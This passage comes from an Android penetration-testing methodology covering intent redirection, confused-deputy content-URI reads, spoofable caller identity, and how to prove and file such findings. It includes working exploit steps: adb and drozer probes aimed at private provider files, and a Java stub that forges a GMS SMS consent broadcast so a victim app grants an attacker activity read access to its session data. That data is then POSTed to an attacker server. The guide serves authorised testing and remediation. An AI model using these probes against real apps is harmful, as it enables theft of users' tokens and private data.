| **Maps to** | `guide/topics/manifest/activity-element` (`android:requireContentUriPermissionFromCaller` values and the three enforced Intent fields); `about/versions/15/features` (`Context.checkContentUriPermissionFull()`, `ComponentCaller`) |

- **Test:** Android 15 lets an activity declare that the *caller* must already hold permission on any
  `content://` URI it passes in — the platform then enforces it on the data URI, the `ClipData` and
  `EXTRA_STREAM`. An exported activity that consumes URIs and does not declare it is relying on nothing.
- **How:**
  ```bash
  grep -nE 'requireContentUriPermissionFromCaller' out/AndroidManifest.merged.xml
  grep -rn 'checkContentUriPermissionFull\|ComponentCaller' out/sources/
  ```
  Then exercise the confused deputy directly:
  ```bash
  adb shell am start -n com.target.app/.ShareReceiverActivity \
    -a android.intent.action.SEND -t 'text/plain' \
    --eu android.intent.extra.STREAM \
    content://com.target.app.fileprovider/internal/shared_prefs/auth.xml
  ```
- **Proof:** The activity renders or uploads the contents of a file the **caller** could not read — the
  exfiltrated bytes in the proxy, while `adb shell cat` of the same path is denied. Then note the absent
  attribute as the available, unused mitigation.
- **Escalation:** → D07/D08-010 when chained to a `FileProvider` with an over-broad `<root-path>`.
- **Ruled out when:** Every exported URI-consuming activity declares the attribute at an appropriate level,
  **or** validates inbound URIs with `checkUriPermission(uri, Process.myPid(), Process.myUid(), flag)` plus
  an authority allow-list before reading — see D08-058.

### D08-057 · `ComponentCaller` checked in `onCreate` but not in `onNewIntent`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if the gate is an auth gate |
| **Attacker** | AM-03 |
| **Applies to** | Android 15+ for the APIs; the `onNewIntent` gap is universal and applies to any caller check |
| **Maps to** | `about/versions/15/features` (`ComponentCaller`, `Context.checkContentUriPermissionFull()`); `risks/intent-redirection` ("Checking `getCallingActivity()` returns non-null" listed as a common mistake; attackers can supply null) |

- **Test:** Android 15 finally gives activities a real caller identity. The new bug is where the check is
  placed. A `singleTop`/`singleTask` exported activity that validates the caller in `onCreate` and then
  processes `onNewIntent` payloads unchecked is bypassed by simply delivering a second intent while it is
  already running — from a different package.
- **How:**
  ```bash
  grep -rn 'ComponentCaller\|checkContentUriPermissionFull\|getCallingActivity()\|onNewIntent' out/sources/
  grep -nE 'launchMode="single(Top|Task|Instance)"' -B6 out/AndroidManifest.merged.xml
  ```
  Drive it: launch the activity legitimately, then from the stub deliver a second intent with a hostile
  payload and no caller identity.
- **Proof:** The privileged action running on the second delivery, with a Frida hook showing the
  `onCreate` validator never re-entered. Pair with the first, validated launch as the control.
- **Escalation:** → D04 for the wider re-delivery surface; → D08-010 if the second intent carries grant
  flags.
- **Ruled out when:** The same validation runs in `onCreate` **and** `onNewIntent` (read both), or the
  activity's launch mode is `standard` so every delivery constructs a new instance.

### D08-058 · Inbound `content://` URI consumed without `checkUriPermission` / authority validation

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) — Critical when the victim's held permission is re-delegated |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `risks/content-resolver` — the documented validators `belongsToCurrentApplication()`, `isExported()` and `wasGrantedPermission()`, whose absence is the bug; MASTG-KNOW-0117 |

- **Test:** The proxy-read direction. The app receives a URI and reads it on the caller's behalf, either
  from its **own internal** provider or from a third-party provider it holds permission for. Two documented
  scenarios, one mechanism: the read happens with the victim's identity.
- **How:**
  ```bash
  grep -rn 'openInputStream\|openOutputStream\|getContentResolver()\.query\|openAssetFileDescriptor' out/sources/ -B10 \
    | grep -nE 'getIntent\(\)|getData\(\)|EXTRA_STREAM|getClipData'
  grep -rn 'checkUriPermission\|resolveContentProvider\|belongsToCurrentApplication\|isExported' out/sources/
  ```
  The documented safe shape to compare against:
  ```kotlin
  fun isExported(ctx: Context, uri: Uri): Boolean {
      val info: ProviderInfo = ctx.packageManager.resolveContentProvider(uri.authority.toString(), 0)!!
      return info.exported
  }
  fun wasGrantedPermission(ctx: Context, uri: Uri?, grantFlag: Int): Boolean =
      ctx.checkUriPermission(uri, Process.myPid(), Process.myUid(), grantFlag) ==
          PackageManager.PERMISSION_GRANTED
  ```
  Probes:
  ```bash
  adb shell am start -n com.target.app/.Import --eu android.intent.extra.STREAM 'content://com.android.contacts/contacts'
  adb shell am start -n com.target.app/.Import --eu android.intent.extra.STREAM 'content://com.target.app.internalprovider/secrets/1'
  ```
- **Proof:** The app rendering or uploading contacts, or its own internal provider's rows — the proxy
  request body is the proof. Mask the values, keep the column names.
- **Escalation:** → D07; → D08-062 if the bytes never reach you (then it is a proxied read, not an
  exfiltration, and you must either find the byte-returning gadget or concede the rating).
- **Ruled out when:** Every inbound URI is validated with `checkUriPermission` against the caller (not
  `Process.myUid()` alone), or the authority is checked against an allow-list that excludes the app's own
  non-exported providers and every system provider.

### D08-059 · `getCallingActivity()` non-null used as an authentication signal

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) if the branch is an auth gate |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `risks/intent-redirection` "Common Mistakes to Avoid" — relying on `getCallingActivity()` returning non-null ("Malicious apps can supply null"), and assuming `checkCallingPermission()` throws when it returns an `int`; `risks/access-control-to-exported-components` |

- **Test:** `getCallingActivity()` is populated only for `startActivityForResult()`, and its contents are
  attacker-controlled anyway. Two failure shapes: a guard of the form
  `if (getCallingActivity() != null && …)` that you skip entirely by using plain `startActivity`, and
  `checkCallingPermission(p);` called for side effect with its `int` result discarded.
- **How:**
  ```bash
  grep -rnE 'getCallingActivity\(\)|getCallingPackage\(\)|checkCallingPermission\(' out/sources/ | grep -vE 'Binder\.getCallingUid'
  ```
  Call each hit both ways from the stub and log which branch runs:
  ```java
  startActivity(i);                 // getCallingActivity() == null
  startActivityForResult(i, 1);     // getCallingActivity() == your component
  ```
- **Proof:** The privileged branch executing under one of the two invocation styles from an untrusted
  package, with a Frida hook printing the branch taken and the value observed.
- **Escalation:** → D13/D15. This is often the *only* control standing between an exported forwarder and a
  privileged internal component, so ruling it out is what upgrades D08-007 from High to Critical.
- **Ruled out when:** The caller identity is taken from `Binder.getCallingUid()` inside a Service or
  ContentProvider, resolved with `PackageManager.getPackagesForUid()` **and** checked against a signature,
  and the `checkCallingPermission` return value is compared to `PackageManager.PERMISSION_GRANTED`.

### D08-060 · `android.intent.extra.REFERRER` or a caller-supplied "source app" string trusted

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when it unlocks a partner-tier flow |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | drozer `android.intent.extra.REFERRER` (verified in the extras list in `src/drozer/android.py`); `risks/access-control-to-exported-components` |

- **Test:** Because `getCallingPackage()` is null for plain `startActivity`, developers reach for the
  spoofable extra instead. Any app can set `EXTRA_REFERRER` or a custom `source_app`/`partner_id` string,
  so any authorisation keyed on it is decorative.
- **How:**
  ```bash
  grep -rnE 'EXTRA_REFERRER|getReferrer\(\)|"referrer"|source_app|partner_id|from_app|caller_id' out/sources/ -B4 -A8
  ```
  ```
  dz> run app.activity.start --component com.target.app com.target.app.PartnerEntryActivity \
        --extra string android.intent.extra.REFERRER android-app://com.trusted.partner \
        --flags ACTIVITY_NEW_TASK
  ```
  ```bash
  adb shell am start -n com.target.app/.PartnerEntryActivity \
    --es android.intent.extra.REFERRER 'android-app://com.trusted.partner'
  ```
- **Proof:** The activity granting partner-tier behaviour — skipping a consent screen, auto-linking an
  account, unlocking a feature — purely because you set the extra. Show the same launch without the extra
  taking the normal path; that differential is the finding.
- **Escalation:** → D13 (auto-linked account) → D23 (entitlement). Call out in the report that
  `Activity.getCallingPackage()` is non-null only for `startActivityForResult`, which is *why* developers
  reach for the spoofable extra — it makes the remediation concrete.
- **Ruled out when:** No authorisation decision reads a referrer-shaped extra, or every such read is
  cross-checked against `Binder.getCallingUid()` plus a signature comparison.

### D08-061 · GMS SMS User Consent receiver as an arbitrary-Intent-launch gadget

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) on the exfiltrated token |
| **Attacker** | AM-03 (attacker app declares **only** `INTERNET`) |
| **Applies to** | any app using GMS SMS User Consent or SMS autofill — typically OTP, login and card-3DS screens. The BAL constraint applies **API 34+** |
| **Maps to** | `developers.google.com/identity/sms-retriever/user-consent/request` × `risks/intent-redirection`; CVE-2021-4438 (React Native SMS User Consent) |

- **Test:** The broadcast carries `SmsRetriever.EXTRA_CONSENT_INTENT` — an `Intent` the app is *expected*
  to start. An exported receiver registered with no broadcast permission is therefore a ready-made
  arbitrary-Intent-launch gadget, not merely an OTP-injection point. The bug: on a success status with no
  OTP-message extra, the receiver does
  `launcher.launch((Intent) extras.getParcelable(EXTRA_CONSENT_INTENT))` with no component, scheme or flag
  validation. A correctly guarded sibling call (`SmsRetriever.SEND_PERMISSION`) elsewhere in the same app
  proves it is a defect, not a design choice.
- **How:**
  ```bash
  grep -rn 'SmsRetriever.SMS_RETRIEVED_ACTION\|com.google.android.gms.auth.api.phone.SMS_RETRIEVED\|EXTRA_CONSENT_INTENT' out/sources/ -A6
  grep -rn 'registerReceiver' out/sources/ | grep -i sms
  grep -rn 'registerReceiver(.*,\s*2\s*)' out/sources/     # ContextCompat RECEIVER_EXPORTED == 2
  grep -rn 'SmsRetriever.SEND_PERMISSION' out/sources/     # the guarded sibling, if any
  ```
  `am broadcast` cannot carry the `Status` Parcelable, so this needs a stub APK:
  ```java
  Intent evil = new Intent(Intent.ACTION_VIEW);
  evil.setComponent(new ComponentName("com.attacker.poc", "com.attacker.poc.ExfilActivity"));
  evil.setData(Uri.parse("content://com.target.app.fileprovider/files/session_backup_payload"));
  evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  Intent b = new Intent("com.google.android.gms.auth.api.phone.SMS_RETRIEVED");
  b.setPackage("com.target.app");
  b.putExtra(SmsRetriever.EXTRA_STATUS, new Status(0));
  b.putExtra(SmsRetriever.EXTRA_CONSENT_INTENT, evil);
  sendBroadcast(b);
  ```
- **Proof:** The victim, as the starter, **self-grants the attacker read access to its own private file**
  — `exported="false"` on the provider is irrelevant — and your activity opens the URI and dumps the
  session payload, token store or database under `files/`. Then POST it to your own server and screenshot
  the C2 view captured on a separate device, with no shell, no adb and no root.
- **Escalation:** Point `data=` at a **protected provider the victim can reach** (contacts, call log) for a
  proxied provider read (D08-034). **BAL gate, decisive on API 34+:** the victim can only launch the
  redirected Intent while it has a visible window (`BAL_ALLOW_VISIBLE_WINDOW`); if the attacker is
  foreground the victim is backgrounded and the launch is `BAL_BLOCK`. So spray the broadcast repeatedly
  and `moveTaskToBack()` immediately, launched over the victim's screen, so the victim resumes to the
  foreground before a spray lands. Report it as "captures on the next login", **not** "unconditional" — the
  precondition is inherent, because the receiver only exists while the OTP/3DS screen is up.
- **Ruled out when:** The receiver is registered `RECEIVER_NOT_EXPORTED`, or requires
  `SmsRetriever.SEND_PERMISSION`, or validates the consent Intent (component/scheme allow-list plus
  `FLAG_GRANT_*` stripping via `androidx.core.content.IntentSanitizer`) before launching. Generalises to
  any `registerForActivityResult`/`onActivityResult` launcher fed an attacker `Parcelable` Intent from an
  exported receiver — check those too before writing the negative.

### D08-062 · The byte-returning gadget — prove exfiltration, not a proxied read

| | |
|---|---|
| **Severity ceiling** | Support (it decides the ceiling of every read finding in this chapter) |
| **VRT** | n/a (governance) — it is what separates `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) from an unrated `broken_access_control.exposed_sensitive_android_intent` |
| **Attacker** | n/a |
| **Applies to** | every confused-deputy read in this chapter — D08-010, -011, -012, -033, -034, -052, -058, -061 |
| **Maps to** | the corpus rule "two verified links plus one unproven link is a Medium, not a Critical"; `docs/02-severity-and-reportability.md`; Oversecured "Gaining access to arbitrary Content Providers" (the four byte-returning vectors) |

- **Test:** Separate a real exfiltration primitive from one where the victim reads its own file and
  **nothing crosses the sandbox boundary**. "I made the app open its own database" is not a data-exposure
  finding; "my zero-permission app holds the bytes" is. Before you rate anything Critical, name the gadget
  in *this* build that returns bytes to your UID.
- **How:** There are only five shapes. Enumerate which exist here, by name and `file:line`:
  ```bash
  # 1. result echo — the victim hands the Intent (and its grants) back to you
  grep -rnE 'setResult\(' out/sources/ -A2 | grep -nE 'getIntent\(\)|intent\)'
  # 2. redirect target you control — component=<attacker> + FLAG_GRANT_* on the nested Intent
  grep -rnE 'FLAG_GRANT_(READ|WRITE|PERSISTABLE|PREFIX)_URI_PERMISSION' out/sources/
  # 3. self-grant from an exported receiver launching an attacker Intent (D08-061)
  grep -rn 'EXTRA_CONSENT_INTENT\|registerForActivityResult\|launcher.launch(' out/sources/
  # 4. a PendingIntent you can send with your own component filled in (D08-037, D08-040)
  # 5. the app's own outbound upload/webhook that you can aim at your collector
  grep -rnE 'okhttp|Retrofit|HttpURLConnection|multipart|EXTRA_STREAM' out/sources/ -B8 | grep -nE 'getIntent\(\)|getData\(\)'
  ```
  Then **prove the copy, not the open.** A share sheet rendering only proves `openInputStream()` returned;
  a triager will say the app may have stat'd the file and nothing more. Aim the same primitive at an
  artefact the app *just created* on this run, and run the negative control:
  ```bash
  adb shell run-as com.target.app ls -l cache/ | tail -5     # note a freshly created 0_<name>
  # positive: point the primitive at cache/0_<name>  -> the sheet/preview renders it
  # negative: point it at cache/0_<random-never-created> -> nothing renders
  ```
- **Proof:** Attacker-side bytes — the file content in your own app's log or on your collector, captured on
  a separate device, with no shell, no adb and no root. The fresh-cache-artefact rendering plus the
  never-created-filename control is what closes the "maybe it only opened it" objection. If no gadget
  exists, the proof is the **enumeration itself**: five shapes searched, none present, stated in the report.
- **Escalation:** Finding the gadget is the whole game. D08-061 is the canonical one because the victim
  itself issues the grant; D08-033 is the cheapest because it needs one grep.
- **Ruled out when:** All five gadget shapes were searched and none exists in this build — in which case
  downgrade the read to Medium with the precondition written out ("the victim reads the file; no path
  returns the bytes to an unprivileged caller in this build"), and say so in the report rather than
  quietly rating it Critical anyway.

### D08-063 · Marker discipline and the paired-refusal control on every redirection claim

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (false-positive discipline) |
| **Attacker** | n/a |
| **Applies to** | every launch, grant and echo claim in this chapter |
| **Maps to** | Marker Discipline (8+ character random markers, search the **baseline** for the marker first); the Body-Diff Rule (a byte-identical result is not a bypass); Server-Policy-vs-State; `docs/07-triage-and-false-positives.md` |

- **Test:** Two failure modes kill redirection reports in triage. First, attributing a launch to your
  payload when the app would have launched that screen anyway. Second, calling a component "non-exported"
  on the strength of a refusal that had nothing to do with export.
- **How:** **Marker.** Put a random 8+ character token in every value you inject, and search the baseline
  before you claim anything:
  ```bash
  M=$(head -c 12 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 10); echo "$M"
  # 1. BASELINE: drive the app normally, with no payload, and prove the marker is absent
  adb logcat -c; adb shell monkey -p com.target.app 1 >/dev/null; sleep 5
  adb logcat -d | grep -c "$M"          # must be 0
  adb shell dumpsys activity activities | grep -c "$M"   # must be 0
  # 2. TEST: the same marker inside the nested Intent
  #    inner.putExtra("url", "https://collector.invalid/" + M)  /  --es token "$M"
  adb logcat -d | grep -n "$M"
  ```
  Never use `test`, `evil`, `attacker`, `poc`, `payload`, `1234` or your own domain as the marker, and do
  not put them in your stub's package name either — a target that logs caller packages will then print
  something a reviewer discounts on sight. **Paired refusal.** The differential *is* the finding:
  ```bash
  adb shell am start -n com.target.app/.internal.NonExportedActivity   # must be REFUSED
  # java.lang.SecurityException: Permission Denial: starting Intent { ... } not exported from uid ...
  adb shell am start -n com.attacker.poc/.Go                            # the redirect: must SUCCEED
  adb shell dumpsys activity activities | grep -m1 -E 'mResumedActivity|ResumedActivity'
  ```
  **Classify every refusal before you trust it.** A failure is not proof of a control; several layers sit
  in front of the export check and each produces a different string:
  ```bash
  adb logcat -d -s ActivityTaskManager ActivityManager PackageManager AndroidRuntime | tail -40
  ```

  | Refusal text | What it actually means |
  |---|---|
  | `Permission Denial: ... not exported from uid` | the export check — the control you wanted to test |
  | `Permission Denial: ... requires <permission>` | a permission gate, not export |
  | `Abort background activity starts` / `BAL_BLOCK` | background-launch policy (API 34+), says nothing about export |
  | `Calling startActivity() from outside of an Activity context ... FLAG_ACTIVITY_NEW_TASK` | your own harness bug |
  | `Intent does not match component's intent filter` / `Access blocked` | Android 16 platform hardening (D08-004), not an app fix |
  | app-thrown `IllegalArgumentException`/validation exception in the app's own frames | the application-level control — the only true negative |

  Run two controls every session: a **known exported** component (must start) and a **known non-exported**
  one (must be refused), so you know your harness distinguishes them at all.
- **Proof:** The marker absent from the baseline and present in the test capture, plus the paired
  refusal/success with both exact strings quoted. For grant claims the analogue of the body diff is the
  read itself: `openInputStream()` throwing `SecurityException` before the redirect and returning the same
  bytes as `run-as cat` afterwards — identical bytes, not "a file opened".
- **Escalation:** n/a — this is what makes every other item in the chapter defensible.
- **Ruled out when:** n/a — unconditional. A launch claim with no baseline check, or a "non-exported"
  claim with no quoted refusal string, is not reportable in this chapter.

### D08-064 · Counted sweeps and the two-stack reproduction bar

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (method) |
| **Attacker** | n/a |
| **Applies to** | the D08-001 census, the D08-005 SDK sweep, and every Critical/High in this chapter |
| **Maps to** | the Shell-Loop Ban ("always count your results"); the Multi-Tool Reproduction Bar for Critical/High; CLAUDE.md Rule 3 (`adb shell` is uid 2000 and is not AM-03) |

- **Test:** The D08-001 join is a loop over hundreds of grep hits, and a zsh array loop that iterates zero
  times prints nothing and looks exactly like a clean app. Anything iterating more than five items goes to
  Python, with a per-item log line and a final count.
- **How:**
  ```python
  #!/usr/bin/env python3
  # d08_sweep.py — extractor -> sink census with an explicit count. usage: d08_sweep.py out/sources
  import os, re, sys
  ROOT = sys.argv[1] if len(sys.argv) > 1 else "out/sources"
  SKIP = re.compile(r"^(android|androidx|kotlin|kotlinx|com/google/android/material)/")
  EXTRACT = re.compile(r"getParcelableExtra\(|getParcelableArrayListExtra\(|getParcelable\(|"
                       r"getSerializableExtra\(|Intent\.parseUri\(|Intent\.getIntent\(|"
                       r"unmarshall\(|readParcelable\(|android\.intent\.extra\.INTENT")
  SINK = re.compile(r"startActivity\(|startActivityForResult\(|startActivities\(|startService\(|"
                    r"startForegroundService\(|bindService\(|sendBroadcast\(|sendOrderedBroadcast\(|"
                    r"setResult\(|\.send\(")
  files = hits = pairs = errors = 0
  for dirpath, _, names in os.walk(ROOT):
      for n in names:
          if not n.endswith((".java", ".kt")):
              continue
          p = os.path.join(dirpath, n)
          rel = os.path.relpath(p, ROOT)
          if SKIP.match(rel):
              continue
          files += 1
          try:
              lines = open(p, encoding="utf-8", errors="replace").read().splitlines()
          except Exception as e:                      # never let one bad file end the sweep
              errors += 1; print("ERR  %s: %s" % (rel, e)); continue
          for i, line in enumerate(lines):
              if not EXTRACT.search(line):
                  continue
              hits += 1
              if any(SINK.search(w) for w in lines[i:i + 12]):
                  pairs += 1
                  print("PAIR %s:%d: %s" % (rel, i + 1, line.strip()[:120]))
  print("# files=%d extractor_hits=%d extractor_sink_pairs=%d read_errors=%d"
        % (files, hits, pairs, errors), file=sys.stderr)
  ```
  ```bash
  python3 d08_sweep.py out/sources > /tmp/d08_pairs.txt 2>/tmp/d08_counts.txt
  cat /tmp/d08_counts.txt      # files= must be in the thousands; a files=0 line means the path is wrong
  wc -l /tmp/d08_pairs.txt
  ```
  **Two stacks for every Critical/High.** `adb shell` runs as uid 2000 (shell), which holds privileges no
  installed app has, and drozer's agent runs as its own app — so reproduce each rated finding through two
  independent paths, at least one of which is a **zero-permission attacker APK**:
  ```bash
  # stack 1 — the attacker APK (the one that establishes AM-03; commit its manifest as evidence)
  adb install -r attacker-poc.apk && adb shell am start -n com.attacker.poc/.Go
  adb shell dumpsys package com.attacker.poc | sed -n '/requested permissions/,/^$/p'
  # stack 2 — drozer or a Frida-driven send from a second process
  ```
  ```
  dz> run app.activity.start --component com.target.app com.target.app.ProxyActivity --extra ...
  ```
- **Proof:** A count line for every sweep (`files=`, `extractor_hits=`, `extractor_sink_pairs=`) and, for
  each Critical/High, two reproductions from different stacks with the attacker manifest showing
  `requested permissions: android.permission.INTERNET` and nothing else.
- **Escalation:** n/a.
- **Ruled out when:** n/a — method. A zero-pair sweep is only a negative once the count line proves the
  sweep actually walked the tree.

### D08-065 · Pre-severity gate against the Critical claim, not against the bug

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (governance) |
| **Attacker** | n/a |
| **Applies to** | every D08 Critical or High claim |
| **Maps to** | the Pre-Severity Gate (five questions against the Critical **claim**); retraction-appendix discipline and its inverse; `docs/02-severity-and-reportability.md` |

- **Test:** Write the draft Critical title, then substitute the **Critical claim** — not the bug — into each
  question. This domain produces more confirmed-primitive-without-a-chain than any other, because
  "I launched a non-exported activity" feels like the finish line and is actually the starting line.
  1. Have I validated the full chain to attacker-attainable impact, or only the launch? *Launch confirmed*
     is not *authentication bypass*. The reached component may re-check the session on entry.
  2. What does the attacker walk away with, in one concrete sentence? "The victim's session token, read by
     a zero-permission app, POSTed to my server" is concrete. "Could lead to account takeover" is not.
  3. Have I reproduced the full chain end to end at least twice, and at least once from an app UID rather
     than `adb shell` (D08-064)?
  4. Is a gate still standing? A re-auth prompt on the internal screen, a device-bound token, an encrypted
     file whose Keystore key you cannot use off-device, `BAL_BLOCK` on API 34+, or Android 16's default
     hardening with no `removeLaunchSecurityProtection()` in the app. If yes, it is "primitive present" at
     a lower severity, documented honestly.
  5. Has the programme rejected this class before? Several programmes exclude "URIs leaked because a
     malicious app has permission to view URIs opened" — so frame the finding around the extras and the
     grant, not around URI visibility.
- **How:** Record the five answers in the working notes before drafting. Attach the D08-004 two-API-level
  table to the answer for question 4 — the vendor will raise it if you do not.
- **Proof:** The five answers, plus the two reproductions from D08-064, plus the platform-version table.
- **Escalation:** When a claim fails the gate, downgrade it and write the retraction into the appendix
  rather than deleting it:
  ```markdown
  ### Retracted: <finding name>
  - **Original signal:** <what looked like a bug>
  - **Disproving evidence:** <reproduction step + observation>
  - **Why it looked like a bug:** <marker collision / shell-UID artefact / platform block read as an app fix>
  - **Retraction date:** <YYYY-MM-DD>
  ```
  The inverse rule matters as much: **do not retract a confirmed finding that stopped reproducing because
  the client patched mid-engagement.** Redirection sinks are a one-line fix and are patched quietly and
  fast. Keep the timestamped pre-patch capture — the `dumpsys` line, the logcat, the app version from
  `aapt dump badging` — and say in the report that the behaviour changed on date X.
- **Ruled out when:** n/a — unconditional for every Critical/High in this chapter.

### D08-066 · Evidence package, chain-filing order and the severity-request paragraph

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (deliverable and submission mechanics) |
| **Attacker** | n/a |
| **Applies to** | every D08 submission |
| **Maps to** | the five-screenshot state-change pattern; HAR/transcript sanitising and the PII split (mask the secret, leave the correlation data visible); chain-filing order — primitives first so their ids exist, then the consumer, then backfill; "one fix equals one bounty"; Bugcrowd VRT `broken_access_control.exposed_sensitive_android_intent` carries **priority null**, so the priority comes entirely from your narrative; `docs/04-poc-and-evidence-standard.md` |

- **Test:** A redirection finding is a state change (a component ran, a grant was issued, a transaction
  repeated), so one screenshot of a screen is not an evidence package. Capture five artefacts in one
  sitting — re-launching the app between captures resets the task stack and revokes the grant, which
  invalidates the earlier ones.
- **How:** Name them `{finding-#}-step{n}-{description}.png` and reference them by filename in the body:
  1. **Pre-state** — the direct attempt refused, with the exact string:
     `am start -n com.target.app/.internal.X` → `SecurityException: Permission Denial: ... not exported`.
     For a grant finding, your app's `openInputStream()` on the target URI throwing `SecurityException`.
  2. **The bug** — the stub app firing the nested payload, and `dumpsys activity activities` naming the
     internal component as resumed (or `dumpsys activity permissions` showing the grant to your uid). The
     most important artefact.
  3. **Post-state negative** — the control: the same payload with the nested extra removed, taking the
     normal path; or the never-created filename from D08-062 producing nothing.
  4. **Post-state positive** — your app holding the bytes / the action completed, with the marker from
     D08-063 visible.
  5. **Side effect** — your collector on a **separate device** showing the exfiltrated value, plus whether
     the victim's UI showed the user anything at all (that answers "would the user notice", which is the
     next question the triager asks).

  Sanitising, ranked by practicality: (A) do not capture the secret — log the byte count and a SHA-256 of
  the stolen file rather than its content, and keep the full capture locally for the triager through the
  platform's private attachment system, never email; (B) black-bar in an image editor; (C) find/replace on
  transcripts and HARs:
  ```bash
  sed -E 's/(access_token|refresh_token|id_token|Authorization|password|otp|pin)["=: ]+[^",[:space:]]+/\1=<REDACTED>/g' \
    d08_exfil.txt > d08_exfil.sanitised.txt
  grep -iE 'token|bearer|password|otp' d08_exfil.sanitised.txt | head   # verify the redaction worked
  ```
  **Leave visible** — the triager needs these to reproduce and to correlate with their logs: your own
  attacker package name and uid, the component and authority names, the flag values (`0x1000000f` etc.),
  the exact `SecurityException` text, request/trace ids, the JSON **key** names, and the device's API
  level. **Mask** — token and cookie values, other users' PII, the victim account's phone number, device
  serial/IMEI. Rotate the test account after submission so anything visible in a screenshot is dead.
- **Proof:** Five numbered, cross-referenced artefacts plus a sanitised transcript, with the unredacted
  originals retained locally, and the attacker APK's manifest committed as evidence of AM-03.
- **Escalation:** **File in the right order.** D08 is a primitive factory and the pieces have independent
  fix surfaces: the forwarder (D08-007), the `FileProvider` path scope (D07), the code-load path (D17), the
  mutable PendingIntent (D08-037). File each primitive first at its standalone severity so its id exists,
  then file the consumer with the full narrative at the chained severity, then backfill:
  ```markdown
  ## Chain partners (filed as separate reports)
  - **submission [UUID-1]** — `ProxyActivity` forwards an unvalidated nested Intent (D08-007)
  - **submission [UUID-2]** — `FileProvider` `<root-path path="."/>` exposes the app data directory (D07)
  These primitives have independent fix surfaces and are filed separately per the programme's
  "one fix = one bounty" rule.
  ```
  Do not paste the chain narrative into every primitive, do not claim each primitive is independently
  Critical, and do not ask for one combined bounty — a chain is a severity amplifier, not a merge request.
  Then open the consumer's body with the severity request, because the VRT node you will be given defaults
  to nothing:
  ```markdown
  ## Severity request — please review carefully before applying VRT default

  The closest VRT category is "Broken Access Control > Exposed Sensitive Android Intent", which carries
  **no default priority** — it is rated on demonstrated impact. **I am requesting evaluation at P[N]
  [standalone | in chain with submission UUID-1]** because:

  1. **What crosses the boundary** — <the exact bytes/action, and the UID that ended up holding them>.
  2. **Attacker model** — a zero-permission third-party app (manifest attached), no root, no adb, no user
     interaction beyond <state it exactly>.
  3. **Platform coverage** — reproduced on API <n> and API <m>; the app <does / does not> call
     `removeLaunchSecurityProtection()`.
  ```
- **Ruled out when:** n/a — unconditional for every submission in this chapter.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "Exported activity forwards an Intent" with no reached component that the caller could not reach directly | The VRT node is `broken_access_control.exposed_sensitive_android_intent`, **priority null** — it is rated on what it exposes, and this exposes nothing new | Land it on a component that is `exported="false"`, or on one whose extras drive an action (D08-007), or attach grant flags (D08-010) |
| A `StrictMode` `UnsafeIntentLaunchViolation` in logcat | A detector firing is a pointer, not an exploit; on its own it is Low and most programmes take it as informational | Weaponise the exact frame it names — the violation then belongs in the report as corroboration, never as the finding (D08-002) |
| `FLAG_MUTABLE` present in the code | Mutability is mandatory for direct reply and legitimate in several APIs; the flag alone says nothing | The base Intent has no `ComponentName`, **or** the named component consumes `getData()`/`getExtras()` from the delivered intent, **and** you can show an acquisition path (D08-037, -038, -044) |
| A mutable PendingIntent that never leaves the process, or is only handed to `AlarmManager` | No acquisition path — a token you cannot obtain is not a capability | Show it on a notification, a widget, a slice, an AIDL return or an Intent extra, and demonstrate the acquisition (D08-040, -045, -046, -047) |
| PendingIntent records read out of `adb shell dumpsys activity intents` | `dumpsys` needs shell or root; AM-12 is not an attack | Obtain the same token from an app UID — a notification listener, a widget host, or an exported component that hands it out |
| A redirect proved only with `adb shell am start` | `shell` is uid 2000 and holds privileges no installed app has; the finding has not established AM-03 | Re-prove from a zero-permission attacker APK and commit its manifest (D08-064) |
| A nested-Intent PoC that fails on Android 16 | That is the platform mitigation, not an application fix — and it is the vendor's favourite way to close the report | Run both API levels (D08-004), report it as an application bug with the platform mitigation noted; if the app calls `removeLaunchSecurityProtection()` it is a finding at full severity on every version (D08-019) |
| The app crashes when you send a malformed nested Intent or an unexpected Parcelable type | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` = **P5**, and it is a self-inflicted local crash | The crash is persistent (crash-on-launch, D04/D19), or the `BadParcelableException` is evidence of a type instantiated before the check, which you then turn into the mismatch finding (D08-028, -029) |
| `grantUriPermissions="true"` on a `FileProvider` | Mandatory for the class — without it the provider throws | The path scope is over-broad (D07), or a redirector issues a grant to your UID (D08-010 → -012) |
| `getCreatorPackage()` appearing in the code | Defensive logging and telemetry use it legitimately | The value reaches an `if` that gates a privileged action (D08-041) — read the branch, not the call |
| `Intent.parseUri` on a string the app itself built (an internal round-trip, `toUri()` then `parseUri()`) | Not attacker-controlled; it is a serialisation convenience | The string reaches `parseUri` from a deep link, a WebView URL, a push payload, a QR code or an extra (D08-022 → -026) |
| `IntentSanitizer` present, strict allow-list, `sanitizeByThrowing` | The documented mitigation, correctly applied | `allowAnyComponent()`, `allowHistoryStackFlags()`, or the log-and-continue `sanitize(intent, logger)` form (D08-018) |
| A URI grant your app already had, re-granted | You granted yourself access to your own data | The grant is to a URI under the **victim's** authority, verified by the same read failing before the redirect (D08-063) |
| "The internal WebView opened" with no control over its URL or its origin | A screen appearing is not impact; this is where most redirection reports stall | Control the loaded URL (D10), reach a bridge method, or read a `file://`/`content://` from that origin |
